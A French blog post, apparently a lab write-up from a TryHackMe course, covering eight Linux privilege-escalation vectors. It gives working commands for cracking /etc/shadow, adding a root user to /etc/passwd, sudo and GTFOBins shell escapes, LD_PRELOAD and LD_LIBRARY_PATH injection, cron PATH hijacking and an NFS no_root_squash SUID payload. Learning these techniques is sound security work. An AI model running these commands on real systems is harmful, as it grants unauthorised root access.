## Avant ce module

Je pensais que l'escalade de privilèges c'était une sorte d'art obscur. Trouver un CVE, lancer un exploit, espérer que ça marche.

Puis j'ai fait le module Linux PrivEsc sur TryHackMe. Huit vecteurs, huit catégories de mauvaise configuration. Aucun ne nécessitait un zero-day. Tous nécessitaient que quelqu'un ait pris une mauvaise décision de configuration à un moment — et moi, que je la remarque.

Cette réalisation m'a frappé plus que les techniques elles-mêmes.

## Commencer par là. À chaque fois.

Avant de toucher quoi que ce soit, énumérer. La checklist que j'ai construite cette semaine :

```bash
uname -a                                          # kernel et architecture
id && whoami                                      # qui suis-je maintenant
sudo -l                                           # ce que je peux lancer en root
find / -perm -u=s -type f 2>/dev/null             # binaires SUID
cat /etc/crontab                                  # tâches planifiées
cat ~/.*history | less                            # ce que l'utilisateur a fait avant moi
cat /etc/exports                                  # partages NFS
```

Chaque ligne est une question. La réponse indique quel vecteur essayer ensuite.

## Les huit vecteurs

**1. Craquer /etc/shadow**

Si tu peux lire `/etc/shadow`, tu as les hashs des mots de passe. On copie le hash root, on l'emporte sur sa propre machine, on laisse John faire le reste avec rockyou.

```bash
grep "root" /etc/shadow > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Le correctif est évident après coup : `/etc/shadow` ne devrait jamais être lisible par tous. Il l'est souvent.

---

**2. /etc/shadow — world-writable**

Une étape de plus : si on peut *écrire* dans shadow, on ne craque rien. On génère son propre hash et on remplace celui de root.

```bash
mkpasswd -m sha-512 monmotdepasse
# éditer /etc/shadow et remplacer le hash root
su root
```

---

**3. /etc/passwd — world-writable**

Même logique, fichier différent. `/etc/passwd` supporte encore les hashs inline (comportement legacy). On ajoute directement un nouvel utilisateur root.

```bash
openssl passwd monmotdepasse
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

Le fait que `/etc/passwd` soit inscriptible par tous est la vulnérabilité en entier. Pas d'exploitation. Juste un éditeur de texte.

---

**4. Sudo + GTFOBins**

`sudo -l` montre ce que l'utilisateur courant peut lancer en root. Si cette liste contient `find`, `vim`, `awk`, `less`, `ftp` ou des dizaines d'autres programmes courants — [GTFOBins](https://gtfobins.github.io) a un one-liner pour s'échapper vers un shell.

```bash
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo vim -c ':!/bin/sh'
```

La mauvaise configuration, c'est d'accorder sudo sur des programmes qui n'ont jamais été conçus pour être des frontières de sécurité.

---

**5. LD_PRELOAD**

Si `sudo -l` montre `env_keep+=LD_PRELOAD`, on peut injecter une shared library qui s'exécute avant n'importe quelle commande sudo. On compile un `.so` qui spawn un shell, on pointe la variable dessus, on lance n'importe quelle commande sudo.

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so find
```

---

**6. LD_LIBRARY_PATH**

Même famille. On trouve quelles shared libraries un binaire exécutable via sudo utilise (`ldd`), puis on en remplace une par une version malveillante dans un répertoire qu'on contrôle.

```bash
ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

---

**7. Cron jobs — PATH hijacking**

Cron exécute des scripts en root. Si le `PATH` du cron inclut un répertoire où on peut écrire — et qu'il arrive *avant* le vrai binaire — on peut y déposer un faux script avec le bon nom. Root exécute notre version à la prochaine minute planifiée.

```bash
cat /etc/crontab              # vérifier si le PATH commence dans un répertoire inscriptible
echo '#!/bin/bash' > /home/user/overwrite.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# attendre 60 secondes
/tmp/rootbash -p
```

Toujours nettoyer : `rm /tmp/rootbash && exit`.

---

**8. NFS — no_root_squash**

Si un partage NFS est exporté avec `no_root_squash`, root sur la machine attaquante a un accès root-level sur le partage — pas de restriction, pas de réduction de privilèges. On monte le partage, on dépose un binaire SUID, on l'exécute sur la cible.

```bash
# sur l'attaquant (en root)
mount -o rw,vers=3 IP_CIBLE:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
# sur la cible
/tmp/shell.elf
```

## Ce qui a vraiment changé

Connaître huit techniques n'est pas la leçon. La leçon, c'est qu'elles partent toutes du même endroit : regarder l'environnement, lire ce qui s'y trouve, se demander *qui a configuré ça et qu'est-ce qu'il a supposé ?*

Chaque vecteur ici est une mauvaise config que quelqu'un a faite — parfois il y a des années, parfois en copiant une réponse Stack Overflow, parfois sans comprendre ce que `no_root_squash` implique vraiment.

La checklist, c'est la compétence. Le reste en découle.
